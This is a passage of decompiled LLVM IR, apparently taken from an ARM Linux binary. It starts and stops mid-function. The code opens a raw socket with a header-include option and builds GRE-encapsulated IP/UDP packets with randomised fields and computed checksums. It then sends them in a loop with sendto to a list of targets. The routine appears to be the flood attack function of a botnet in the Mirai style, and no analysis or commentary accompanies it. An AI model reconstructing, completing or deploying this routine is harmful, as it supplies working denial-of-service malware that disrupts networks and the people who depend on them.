  store i32 3, i32* %r2.global-to-local, align 4
  %v5_91bc = call i32 @__GI_setsockopt(i32 %v3_9190, i32 0, i32 3, i32 %v6_91a8, i32 4)
  %v7_91c0 = icmp eq i32 %v5_91bc, -1
  store i1 %v7_91c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_91c0, label %dec_label_pc_962c, label %dec_label_pc_91c8

dec_label_pc_91c8:                                ; preds = %dec_label_pc_91a0
  %v0_91c8 = load i32, i32* @r8, align 4
  %v0_91cc = load i32, i32* @r7, align 4
  %v0_91d0 = load i32, i32* %fp.global-to-local, align 4
  %v0_91d4 = load i32, i32* @r6, align 4
  %v1_91d4 = urem i32 %v0_91d4, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_91dc = urem i32 %v0_91c8, 65536
  store i32 %v3_91dc, i32* %r3.global-to-local, align 4
  %v3_91e0 = urem i32 %v0_91cc, 65536
  store i32 %v3_91e0, i32* %r4.global-to-local, align 4
  %v0_91e4 = load i32, i32* @sl, align 4
  %v2_91e4 = icmp eq i32 %v0_91e4, 0
  store i1 %v2_91e4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  %v3_91fc = urem i32 %v0_91d0, 65536
  store i32 %v3_91fc, i32* @fp, align 4
  br i1 %v2_91e4, label %dec_label_pc_9640, label %dec_label_pc_920c

dec_label_pc_920c:                                ; preds = %dec_label_pc_91c8
  %v3_91cc = mul i32 %v0_91cc, 65536
  %v3_91c8 = mul i32 %v0_91c8, 65536
  %v0_91d0.not = or i32 %v0_91d0, -65536
  %v1_9210 = xor i32 %v0_91d0.not, 65535
  %v3_9214 = mul i32 %v6_9128, 65536
  %v1_9218 = add i32 %v3_9214, 3407872
  %tmp67 = udiv i32 %v1_9218, 256
  %v3_922c = and i32 %tmp67, 65280
  %tmp68 = mul nsw i32 %v1_9210, 256
  %v3_9230 = and i32 %tmp68, 65280
  store i32 %v3_9230, i32* %ip.global-to-local, align 4
  %v1_9234 = add i32 %v3_9214, 524288
  %v1_923c = add i32 %v3_9214, 1835008
  %tmp69 = udiv i32 %v1_9210, 256
  %v4_9240 = urem i32 %tmp69, 256
  %v5_9240 = or i32 %v4_9240, %v3_9230
  %v4_9248 = udiv i32 %v1_9218, 16777216
  %v5_9248 = or i32 %v3_922c, %v4_9248
  store i32 %v5_9248, i32* @r8, align 4
  %v3_9254 = udiv i32 %v1_923c, 256
  %tmp70 = mul i32 %v0_91d0, 256
  %v3_9258 = and i32 %tmp70, 65280
  store i32 %v3_91c8, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v0_91d0, 256
  %v4_9268 = urem i32 %tmp71, 256
  %v5_9268 = or i32 %v4_9268, %v3_9258
  %tmp72 = mul i32 %v0_91c8, 256
  %v3_926c = and i32 %tmp72, 65280
  %v1_9270 = and i32 %v3_9254, 65280
  store i32 %v1_9270, i32* @r6, align 4
  store i32 %v3_91cc, i32* %r1.global-to-local, align 4
  %tmp73 = mul i32 %v0_91cc, 256
  %v3_927c = and i32 %tmp73, 65280
  %tmp74 = udiv i32 %v0_91c8, 256
  %v4_9280 = urem i32 %tmp74, 256
  %v5_9280 = or i32 %v4_9280, %v3_926c
  store i32 %v5_9280, i32* @lr, align 4
  %v4_9284 = udiv i32 %v1_923c, 16777216
  %v5_9284 = or i32 %v1_9270, %v4_9284
  store i32 %v5_9284, i32* %r3.global-to-local, align 4
  %tmp75 = udiv i32 %v0_91cc, 256
  %v4_9288 = urem i32 %tmp75, 256
  %v5_9288 = or i32 %v4_9288, %v3_927c
  %tmp76 = udiv i32 %v1_9234, 256
  %v3_928c = and i32 %tmp76, 65280
  store i32 %v3_928c, i32* @r5, align 4
  %v4_92a0 = udiv i32 %v1_9234, 16777216
  %v5_92a0 = or i32 %v3_928c, %v4_92a0
  store i32 %v5_92a0, i32* @r7, align 4
  store i32 0, i32* @r4, align 4
  %sext12 = mul nuw i32 %v5_9268, 65536
  %v4_930c13 = sdiv i32 %sext12, 65536
  %sext8 = mul nuw i32 %v5_9284, 65536
  %v4_9370 = sdiv i32 %sext8, 65536
  %sext9 = mul nuw i32 %v5_9240, 65536
  %v4_9374 = sdiv i32 %sext9, 65536
  %v1_937c = trunc i32 %v4_9370 to i16
  %v2_93a4 = icmp eq i32 %v1_91d4, 0
  %sext10 = mul nuw i32 %v5_9280, 65536
  %v4_93c4 = sdiv i32 %sext10, 65536
  %sext11 = mul nuw i32 %v5_9288, 65536
  %v4_93cc = sdiv i32 %sext11, 65536
  %v1_9304 = trunc i32 %v6_90b0 to i8
  br label %dec_label_pc_92a8

dec_label_pc_92a8:                                ; preds = %bb82, %dec_label_pc_920c
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_92b4 = call i32 @calloc(i32 1510, i32 4)
  store i32 %v2_905c, i32* %r2.global-to-local, align 4
  %v3_92bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92bc, i32* %r3.global-to-local, align 4
  %v2_92c0 = load i32, i32* @r4, align 4
  %v5_92c0 = mul i32 %v2_92c0, 4
  %v6_92c0 = add i32 %v5_92c0, %v2_905c
  %v7_92c0 = inttoptr i32 %v6_92c0 to i32*
  store i32 %v2_92b4, i32* %v7_92c0, align 4
  %v0_92c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_92c4 = load i32, i32* %r3.global-to-local, align 4
  %v4_92c4 = mul i32 %v1_92c4, 4
  %v5_92c4 = add i32 %v4_92c4, %v0_92c4
  %v6_92c4 = inttoptr i32 %v5_92c4 to i32*
  %v7_92c4 = load i32, i32* %v6_92c4, align 4
  store i32 %v7_92c4, i32* %r4.global-to-local, align 4
  %v1_92c8 = inttoptr i32 %v7_92c4 to i8*
  %v2_92c8 = load i8, i8* %v1_92c8, align 1
  %tmp = urem i8 %v2_92c8, 16
  %v1_92cc = zext i8 %tmp to i32
  %v1_92d0 = or i32 %v1_92cc, 64
  store i32 %v1_92d0, i32* %r2.global-to-local, align 4
  %v1_92d4 = trunc i32 %v1_92d0 to i8
  store i8 %v1_92d4, i8* %v1_92c8, align 1
  %v0_92d8 = load i32, i32* %r3.global-to-local, align 4
  %v5_92dc = mul i32 %v0_92d8, 24
  store i32 %v5_92dc, i32* %r1.global-to-local, align 4
  %v0_92e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_92e0 = inttoptr i32 %v0_92e0 to i8*
  %v2_92e0 = load i8, i8* %v1_92e0, align 1
  %v1_92e4 = and i8 %v2_92e0, -16
  %v1_92e8 = or i8 %v1_92e4, 5
  store i32 %v1_90dc, i32* %r5.global-to-local, align 4
  store i8 %v1_92e8, i8* %v1_92e0, align 1
  store i32 %v6_9074, i32* %r2.global-to-local, align 4
  %v2_92f8 = load i32, i32* %r4.global-to-local, align 4
  %v3_92f8 = add i32 %v2_92f8, 1
  %v4_92f8 = inttoptr i32 %v3_92f8 to i8*
  store i8 %v5_9094, i8* %v4_92f8, align 1
  store i32 %v1_90b8, i32* %r3.global-to-local, align 4
  %v0_9300 = load i32, i32* %r5.global-to-local, align 4
  %v2_9300 = icmp eq i32 %v0_9300, 0
  store i1 %v2_9300, i1* %cpsr_z.global-to-local, align 1
  %v2_9304 = load i32, i32* %r4.global-to-local, align 4
  %v3_9304 = add i32 %v2_9304, 8
  %v4_9304 = inttoptr i32 %v3_9304 to i8*
  store i8 %v1_9304, i8* %v4_9304, align 1
  %v0_9308 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9308, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_92a8
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  br label %bb77

bb:                                               ; preds = %dec_label_pc_92a8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v4_930c13, i32* %r5.global-to-local, align 4
  %v3_9310 = load i32, i32* %r4.global-to-local, align 4
  %v4_9310 = add i32 %v3_9310, 6
  %v5_9310 = inttoptr i32 %v4_9310 to i16*
  store i16 64, i16* %v5_9310, align 2
  br label %bb77

bb77:                                             ; preds = %.thread, %bb
  %v2_9318 = load i32, i32* %r4.global-to-local, align 4
  %v3_9318 = add i32 %v2_9318, 9
  %v4_9318 = inttoptr i32 %v3_9318 to i8*
  store i8 47, i8* %v4_9318, align 1
  %v0_931c = load i32, i32* %r4.global-to-local, align 4
  %v1_931c = add i32 %v0_931c, 20
  store i32 %v1_931c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_9324 = load i32, i32* %r5.global-to-local, align 4
  %v1_9324 = trunc i32 %v0_9324 to i16
  %v3_9324 = add i32 %v0_931c, 4
  %v4_9324 = inttoptr i32 %v3_9324 to i16*
  store i16 %v1_9324, i16* %v4_9324, align 2
  %v0_9328 = load i32, i32* @r8, align 4
  %v1_9328 = trunc i32 %v0_9328 to i16
  %v2_9328 = load i32, i32* %r4.global-to-local, align 4
  %v3_9328 = add i32 %v2_9328, 2
  %v4_9328 = inttoptr i32 %v3_9328 to i16*
  store i16 %v1_9328, i16* %v4_9328, align 2
  %v0_932c = load i32, i32* %r3.global-to-local, align 4
  %v1_932c = trunc i32 %v0_932c to i16
  %v2_932c = load i32, i32* %r2.global-to-local, align 4
  %v3_932c = add i32 %v2_932c, 2
  %v4_932c = inttoptr i32 %v3_932c to i16*
  store i16 %v1_932c, i16* %v4_932c, align 2
  store i32 %v6_917c, i32* %r3.global-to-local, align 4
  %v0_9334 = load i32, i32* %r4.global-to-local, align 4
  %v1_9334 = add i32 %v0_9334, 24
  %v2_9334 = inttoptr i32 %v1_9334 to i8*
  %v3_9334 = load i8, i8* %v2_9334, align 1
  %v4_9334 = zext i8 %v3_9334 to i32
  store i32 %v4_9334, i32* %r2.global-to-local, align 4
  %v2_9338 = add i32 %v0_9334, 12
  %v3_9338 = inttoptr i32 %v2_9338 to i32*
  store i32 %v6_917c, i32* %v3_9338, align 4
  %v0_933c = load i32, i32* %r2.global-to-local, align 4
  %v1_933c = and i32 %v0_933c, -241
  %v1_9340 = or i32 %v1_933c, 64
  store i32 %v1_9340, i32* %r2.global-to-local, align 4
  %v0_9344 = load i32, i32* %r1.global-to-local, align 4
  %v1_9344 = load i32, i32* @sb, align 4
  %v2_9344 = add i32 %v1_9344, %v0_9344
  store i32 %v2_9344, i32* %r1.global-to-local, align 4
  %v1_9348 = add i32 %v2_9344, 16
  %v2_9348 = inttoptr i32 %v1_9348 to i32*
  %v3_9348 = load i32, i32* %v2_9348, align 4
  store i32 %v3_9348, i32* %r1.global-to-local, align 4
  %v1_934c = trunc i32 %v1_9340 to i8
  %v2_934c = load i32, i32* %r4.global-to-local, align 4
  %v3_934c = add i32 %v2_934c, 24
  %v4_934c = inttoptr i32 %v3_934c to i8*
  store i8 %v1_934c, i8* %v4_934c, align 1
  %v0_9350 = load i32, i32* %r4.global-to-local, align 4
  %v1_9350 = add i32 %v0_9350, 24
  %v2_9350 = inttoptr i32 %v1_9350 to i8*
  %v3_9350 = load i8, i8* %v2_9350, align 1
  %v1_9354 = and i8 %v3_9350, -16
  %v1_9358 = or i8 %v1_9354, 5
  store i8 %v1_9358, i8* %v2_9350, align 1
  %v0_9360 = load i32, i32* %r1.global-to-local, align 4
  %v1_9360 = load i32, i32* %r4.global-to-local, align 4
  %v2_9360 = add i32 %v1_9360, 16
  %v3_9360 = inttoptr i32 %v2_9360 to i32*
  store i32 %v0_9360, i32* %v3_9360, align 4
  %v0_9368 = load i32, i32* %r4.global-to-local, align 4
  %v1_9368 = add i32 %v0_9368, 24
  store i32 %v1_9368, i32* @r5, align 4
  %v3_936c = add i32 %v0_9368, 25
  %v4_936c = inttoptr i32 %v3_936c to i8*
  store i8 %v5_9094, i8* %v4_936c, align 1
  store i32 %v4_9370, i32* %r2.global-to-local, align 4
  store i32 %v4_9374, i32* %r3.global-to-local, align 4
  store i32 %v1_90b8, i32* %r1.global-to-local, align 4
  %v2_937c = load i32, i32* @r5, align 4
  %v3_937c = add i32 %v2_937c, 2
  %v4_937c = inttoptr i32 %v3_937c to i16*
  store i16 %v1_937c, i16* %v4_937c, align 2
  %v0_9380 = load i32, i32* %r3.global-to-local, align 4
  %v1_9380 = trunc i32 %v0_9380 to i16
  %v2_9380 = load i32, i32* @r5, align 4
  %v3_9380 = add i32 %v2_9380, 4
  %v4_9380 = inttoptr i32 %v3_9380 to i16*
  store i16 %v1_9380, i16* %v4_9380, align 2
  %v0_9384 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9384, label %bb79, label %bb78

bb78:                                             ; preds = %bb77
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %bb77, %bb78
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_938c = load i32, i32* %r1.global-to-local, align 4
  %v1_938c = trunc i32 %v0_938c to i8
  %v2_938c = load i32, i32* @r5, align 4
  %v3_938c = add i32 %v2_938c, 8
  %v4_938c = inttoptr i32 %v3_938c to i8*
  store i8 %v1_938c, i8* %v4_938c, align 1
  %v0_9390 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9390, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_9390 = load i32, i32* %r2.global-to-local, align 4
  %v2_9390 = trunc i32 %v1_9390 to i16
  %v3_9390 = load i32, i32* @r5, align 4
  %v4_9390 = add i32 %v3_9390, 6
  %v5_9390 = inttoptr i32 %v4_9390 to i16*
  store i16 %v2_9390, i16* %v5_9390, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v0_9394 = load i32, i32* %r3.global-to-local, align 4
  %v1_9394 = trunc i32 %v0_9394 to i8
  %v2_9394 = load i32, i32* @r5, align 4
  %v3_9394 = add i32 %v2_9394, 9
  %v4_9394 = inttoptr i32 %v3_9394 to i8*
  store i8 %v1_9394, i8* %v4_9394, align 1
  %v0_9398 = call i32 @rand_next()
  store i32 %v1_91d4, i32* %r1.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  %v1_93a8 = sub i32 1023, %v0_9398
  store i32 %v1_93a8, i32* %r3.global-to-local, align 4
  br i1 %v2_93a4, label %.thread14, label %.thread15

.thread14:                                        ; preds = %bb81
  %v2_93b0 = load i32, i32* @r5, align 4
  %v3_93b0 = add i32 %v2_93b0, 16
  %v4_93b0 = inttoptr i32 %v3_93b0 to i32*
  store i32 %v1_93a8, i32* %v4_93b0, align 4
  br label %bb82

.thread15:                                        ; preds = %bb81
  %v1_93ac = load i32, i32* %r4.global-to-local, align 4
  %v2_93ac = add i32 %v1_93ac, 16
  %v3_93ac = inttoptr i32 %v2_93ac to i32*
  %v4_93ac = load i32, i32* %v3_93ac, align 4
  store i32 %v4_93ac, i32* %r3.global-to-local, align 4
  %v2_93b4 = load i32, i32* @r5, align 4
  %v3_93b4 = add i32 %v2_93b4, 16
  %v4_93b4 = inttoptr i32 %v3_93b4 to i32*
  store i32 %v4_93ac, i32* %v4_93b4, align 4
  br label %bb82

bb82:                                             ; preds = %.thread14, %.thread15
  %v1_93b8 = load i32, i32* @r5, align 4
  %v2_93b8 = add i32 %v1_93b8, 12
  %v3_93b8 = inttoptr i32 %v2_93b8 to i32*
  store i32 %v0_9398, i32* %v3_93b8, align 4
  %v3_93bc = load i32, i32* %stack_var_-44, align 4
  %v0_93c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_93c0 = add i32 %v0_93c0, 44
  store i32 %v1_93c0, i32* @r6, align 4
  store i32 %v4_93c4, i32* %r2.global-to-local, align 4
  %v1_93c8 = add i32 %v3_93bc, 1
  store i32 %v1_93c8, i32* @r4, align 4
  store i32 %v4_93cc, i32* %r3.global-to-local, align 4
  %v1_93d0 = load i32, i32* @sl, align 4
  %v9_93d0 = icmp eq i32 %v1_93c8, %v1_93d0
  store i1 %v9_93d0, i1* %cpsr_z.global-to-local, align 1
  %v0_93d4 = load i32, i32* @r7, align 4
  %v1_93d4 = trunc i32 %v0_93d4 to i16
  %v3_93d4 = add i32 %v0_93c0, 48
  %v4_93d4 = inttoptr i32 %v3_93d4 to i16*
  store i16 %v1_93d4, i16* %v4_93d4, align 2
  %v0_93d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_93d8 = trunc i32 %v0_93d8 to i16
  %v2_93d8 = load i32, i32* @r6, align 4
  %v3_93d8 = inttoptr i32 %v2_93d8 to i16*
  store i16 %v1_93d8, i16* %v3_93d8, align 2
  %v0_93dc = load i32, i32* %r3.global-to-local, align 4
  %v1_93dc = trunc i32 %v0_93dc to i16
  %v2_93dc = load i32, i32* @r6, align 4
  %v3_93dc = add i32 %v2_93dc, 2
  %v4_93dc = inttoptr i32 %v3_93dc to i16*
  store i16 %v1_93dc, i16* %v4_93dc, align 2
  %v0_93e0 = load i32, i32* @r4, align 4
  store i32 %v0_93e0, i32* %stack_var_-44, align 4
  %v5_93e4 = icmp slt i32 %v1_93c8, %v1_93d0
  br i1 %v5_93e4, label %dec_label_pc_92a8, label %dec_label_pc_93e8

dec_label_pc_93e8:                                ; preds = %bb82
  store i32 %v6_9128, i32* %r5.global-to-local, align 4
  %v1_93f0 = add i32 %v6_9128, 8
  store i32 %v1_93f0, i32* %r4.global-to-local, align 4
  %v0_9400.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_93fc.preheader

dec_label_pc_93fc.preheader:                      ; preds = %dec_label_pc_93e8, %dec_label_pc_9640
  %v0_9400.pre = phi i32 [ %v0_9400.pre.pre, %dec_label_pc_93e8 ], [ 0, %dec_label_pc_9640 ]
  %stack_var_-124.0.ph = phi i32 [ %v1_93f0, %dec_label_pc_93e8 ], [ %v1_9648, %dec_label_pc_9640 ]
  %storemerge = add i32 %v6_9128, 52
  store i32 %storemerge, i32* @r8, align 4
  %v2_95f4 = icmp eq i32 %v1_91d4, 0
  %v2_9610 = icmp eq i32 %v1_9148, 0
  %v2_943c = icmp eq i32 %v6_917c, -1
  %v7_943c = icmp eq i32 %v6_917c, -1
  br label %dec_label_pc_93fc

dec_label_pc_93fc:                                ; preds = %dec_label_pc_93fc, %dec_label_pc_948c, %dec_label_pc_93fc.preheader
  %v0_9400 = phi i32 [ %v0_9400.pre, %dec_label_pc_93fc.preheader ], [ 0, %dec_label_pc_93fc ], [ %v1_9528, %dec_label_pc_948c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9400 = icmp eq i32 %v0_9400, 0
  store i1 %v2_9400, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9400, label %dec_label_pc_93fc, label %dec_label_pc_940c

dec_label_pc_940c:                                ; preds = %dec_label_pc_93fc
  br label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_948c, %dec_label_pc_940c
  %v1_9424 = phi i32 [ %v1_9524, %dec_label_pc_948c ], [ 0, %dec_label_pc_940c ]
  %v5_9414 = mul i32 %v1_9424, 24
  %v1_9418 = load i32, i32* @sb, align 4
  %v2_9418 = add i32 %v1_9418, %v5_9414
  store i32 %v2_9418, i32* %r3.global-to-local, align 4
  store i32 %v2_905c, i32* %r4.global-to-local, align 4
  %v1_9420 = add i32 %v2_9418, 20
  %v2_9420 = inttoptr i32 %v1_9420 to i8*
  %v3_9420 = load i8, i8* %v2_9420, align 1
  %v4_9420 = zext i8 %v3_9420 to i32
  store i32 %v4_9420, i32* %r2.global-to-local, align 4
  %v4_9424 = mul i32 %v1_9424, 4
  %v5_9424 = add i32 %v4_9424, %v2_905c
  %v6_9424 = inttoptr i32 %v5_9424 to i32*
  %v7_9424 = load i32, i32* %v6_9424, align 4
  store i32 %v7_9424, i32* @r5, align 4
  %v7_9428 = icmp eq i8 %v3_9420, 31
  store i1 %v7_9428, i1* %cpsr_z.global-to-local, align 1
  %v1_942c = add i32 %v7_9424, 24
  store i32 %v1_942c, i32* @r6, align 4
  %v1_9430 = add i32 %v7_9424, 44
  store i32 %v1_9430, i32* @r7, align 4
  %tmp86 = icmp ult i8 %v3_9420, 32
  br i1 %tmp86, label %dec_label_pc_9538, label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_9410
  store i32 %v6_917c, i32* %r1.global-to-local, align 4
  store i1 %v7_943c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_943c, label %dec_label_pc_9598, label %dec_label_pc_9444

dec_label_pc_9444:                                ; preds = %dec_label_pc_9538, %dec_label_pc_9438
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_944c = load i32, i32* @fp, align 4
  %v9_944c = icmp eq i32 %v0_944c, 65535
  store i1 %v9_944c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_944c, label %dec_label_pc_95b0, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9598.dec_label_pc_9454_crit_edge, %dec_label_pc_9444
  %v1_9458 = phi i32 [ %v1_9458.pre, %dec_label_pc_9598.dec_label_pc_9454_crit_edge ], [ 65535, %dec_label_pc_9444 ]
  store i32 %v3_91dc, i32* %r2.global-to-local, align 4
  %v9_9458 = icmp eq i32 %v3_91dc, %v1_9458
  store i1 %v9_9458, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9458, label %dec_label_pc_95d8, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_95b0.dec_label_pc_9460_crit_edge, %dec_label_pc_9454
  %v1_9464 = phi i32 [ %v1_9464.pre, %dec_label_pc_95b0.dec_label_pc_9460_crit_edge ], [ %v1_9458, %dec_label_pc_9454 ]
  store i32 %v3_91e0, i32* %r3.global-to-local, align 4
  %v9_9464 = icmp eq i32 %v3_91e0, %v1_9464
  store i1 %v9_9464, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9464, label %dec_label_pc_95ec, label %dec_label_pc_946c

dec_label_pc_946c:                                ; preds = %dec_label_pc_95d8, %dec_label_pc_9460
  store i32 %v1_91d4, i32* @r4, align 4
  store i1 %v2_95f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_95f4, label %dec_label_pc_9608, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_946c
  %v1_9474 = load i32, i32* @r5, align 4
  %v2_9474 = add i32 %v1_9474, 16
  %v3_9474 = inttoptr i32 %v2_9474 to i32*
  %v4_9474 = load i32, i32* %v3_9474, align 4
  store i32 %v4_9474, i32* %r3.global-to-local, align 4
  %v2_9478 = load i32, i32* @r6, align 4
  %v3_9478 = add i32 %v2_9478, 16
  %v4_9478 = inttoptr i32 %v3_9478 to i32*
  store i32 %v4_9474, i32* %v4_9478, align 4
  br label %dec_label_pc_9480

dec_label_pc_9480:                                ; preds = %bb85, %.thread16
  store i32 %v1_9148, i32* %r1.global-to-local, align 4
  store i1 %v2_9610, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9610, label %dec_label_pc_948c, label %dec_label_pc_961c

dec_label_pc_948c:                                ; preds = %dec_label_pc_9480, %dec_label_pc_9608, %dec_label_pc_961c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_9490 = load i32, i32* @r5, align 4
  %v3_9490 = add i32 %v2_9490, 10
  %v4_9490 = inttoptr i32 %v3_9490 to i16*
  store i16 0, i16* %v4_9490, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9498 = load i32, i32* @r5, align 4
  store i32 %v0_9498, i32* @r0, align 4
  %v2_949c = call i32 @checksum_generic(i32 %v0_9498, i32 20)
  %v3_949c = trunc i32 %v2_949c to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_94a4 = load i32, i32* @r5, align 4
  %v4_94a4 = add i32 %v3_94a4, 10
  %v5_94a4 = inttoptr i32 %v4_94a4 to i16*
  store i16 %v3_949c, i16* %v5_94a4, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_94ac = load i32, i32* %r3.global-to-local, align 4
  %v1_94ac = trunc i32 %v0_94ac to i16
  %v2_94ac = load i32, i32* @r6, align 4
  %v3_94ac = add i32 %v2_94ac, 10
  %v4_94ac = inttoptr i32 %v3_94ac to i16*
  store i16 %v1_94ac, i16* %v4_94ac, align 2
  %v0_94b0 = load i32, i32* @r6, align 4
  store i32 %v0_94b0, i32* @r0, align 4
  %v2_94b4 = call i32 @checksum_generic(i32 %v0_94b0, i32 20)
  %v3_94b4 = trunc i32 %v2_94b4 to i16
  %v3_94b8 = load i32, i32* @r6, align 4
  %v4_94b8 = add i32 %v3_94b8, 10
  %v5_94b8 = inttoptr i32 %v4_94b8 to i16*
  store i16 %v3_94b4, i16* %v5_94b8, align 2
  store i32 0, i32* @r4, align 4
  %v0_94c0 = load i32, i32* @r7, align 4
  store i32 %v0_94c0, i32* @r1, align 4
  %v1_94c4 = add i32 %v0_94c0, 4
  %v2_94c4 = inttoptr i32 %v1_94c4 to i16*
  %v3_94c4 = load i16, i16* %v2_94c4, align 2
  %v4_94c4 = zext i16 %v3_94c4 to i32
  store i32 %v4_94c4, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-124.0.ph, i32* %r3.global-to-local, align 4
  %v3_94cc = add i32 %v0_94c0, 6
  %v4_94cc = inttoptr i32 %v3_94cc to i16*
  store i16 0, i16* %v4_94cc, align 2
  %v0_94d0 = load i32, i32* @r6, align 4
  %v4_94d4 = call i32 @checksum_tcpudp(i32 %v0_94d0, i32 %v0_94c0, i32 %v4_94c4, i32 %stack_var_-124.0.ph)
  %v5_94d4 = trunc i32 %v4_94d4 to i16
  %v3_94d8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_94d8, i32* %r2.global-to-local, align 4
  %v3_94dc = mul i32 %v3_94d8, 32
  store i32 %v3_94dc, i32* %r3.global-to-local, align 4
  %v0_94e0 = load i32, i32* @r5, align 4
  %v1_94e0 = add i32 %v0_94e0, 16
  %v2_94e0 = inttoptr i32 %v1_94e0 to i32*
  %v3_94e0 = load i32, i32* %v2_94e0, align 4
  %v5_94e4 = mul i32 %v3_94d8, 24
  store i32 %v5_94e4, i32* %r3.global-to-local, align 4
  %v1_94e8 = load i32, i32* @sb, align 4
  %v2_94e8 = add i32 %v1_94e8, %v5_94e4
  store i32 %v2_94e8, i32* @lr, align 4
  %v2_94ec = add i32 %v2_94e8, 4
  %v3_94ec = inttoptr i32 %v2_94ec to i32*
  store i32 %v3_94e0, i32* %v3_94ec, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_94f4 = load i32, i32* @r7, align 4
  %v4_94f4 = add i32 %v3_94f4, 6
  %v5_94f4 = inttoptr i32 %v4_94f4 to i16*
  store i16 %v5_94d4, i16* %v5_94f4, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_94fc = load i32, i32* %r1.global-to-local, align 4
  %v1_94fc = trunc i32 %v0_94fc to i16
  %v2_94fc = load i32, i32* %r3.global-to-local, align 4
  %v3_94fc = load i32, i32* @sb, align 4
  %v4_94fc = add i32 %v3_94fc, %v2_94fc
  %v5_94fc = inttoptr i32 %v4_94fc to i16*
  store i16 %v1_94fc, i16* %v5_94fc, align 2
  %v0_9500 = load i32, i32* @r4, align 4
  %v1_9500 = trunc i32 %v0_9500 to i16
  %v2_9500 = load i32, i32* @lr, align 4
  %v3_9500 = add i32 %v2_9500, 2
  %v4_9500 = inttoptr i32 %v3_9500 to i16*
  store i16 %v1_9500, i16* %v4_9500, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9508 = load i32, i32* @r5, align 4
  store i32 %v0_9508, i32* %r1.global-to-local, align 4
  %v0_9510 = load i32, i32* @r8, align 4
  store i32 %v0_9510, i32* %r2.global-to-local, align 4
  %v0_9514 = load i32, i32* @lr, align 4
  %v0_9518 = load i32, i32* %ip.global-to-local, align 4
  %v6_951c = call i32 @__libc_sendto(i32 %v3_9190, i32 %v0_9508, i32 %v0_9510, i32 16384, i32 %v0_9514, i32 %v0_9518)
  %v3_9520 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9520, i32* %r3.global-to-local, align 4
  %v1_9524 = add i32 %v3_9520, 1
  %v1_9528 = load i32, i32* @sl, align 4
  %v9_9528 = icmp eq i32 %v1_9524, %v1_9528
  store i1 %v9_9528, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9524, i32* %stack_var_-44, align 4
  %v6_9530 = icmp slt i32 %v1_9524, %v1_9528
  br i1 %v6_9530, label %dec_label_pc_9410, label %dec_label_pc_93fc

dec_label_pc_9538:                                ; preds = %dec_label_pc_9410
  %v1_9538 = add i32 %v2_9418, 16
  %v2_9538 = inttoptr i32 %v1_9538 to i32*
  %v3_9538 = load i32, i32* %v2_9538, align 4
  store i32 %v3_9538, i32* %r4.global-to-local, align 4
  %v0_953c = call i32 @rand_next()
  %v3_9540 = load i32, i32* %stack_var_-44, align 4
  %v5_9548 = mul i32 %v3_9540, 24
  %v0_954c = load i32, i32* %r4.global-to-local, align 4
  %v1_954c = and i32 %v0_954c, 16711680
  store i32 %v1_954c, i32* %ip.global-to-local, align 4
  %v3_9550 = udiv i32 %v0_954c, 16777216
  %v4_9554 = udiv i32 %v1_954c, 256
  %v5_9554 = or i32 %v4_9554, %v3_9550
  store i32 %v5_9554, i32* %r2.global-to-local, align 4
  %v1_9558 = load i32, i32* @sb, align 4
  %v2_9558 = add i32 %v1_9558, %v5_9548
  store i32 %v2_9558, i32* %r1.global-to-local, align 4
  %v1_955c = and i32 %v0_954c, ptrtoint (i32* @global_var_ff00.33 to i32)
  store i32 %v1_955c, i32* %r3.global-to-local, align 4
  %v1_9560 = add i32 %v2_9558, 20
  %v2_9560 = inttoptr i32 %v1_9560 to i8*
  %v3_9560 = load i8, i8* %v2_9560, align 1
  %v4_9560 = zext i8 %v3_9560 to i32
  store i32 %v4_9560, i32* %ip.global-to-local, align 4
  %v4_9564 = mul i32 %v1_955c, 256
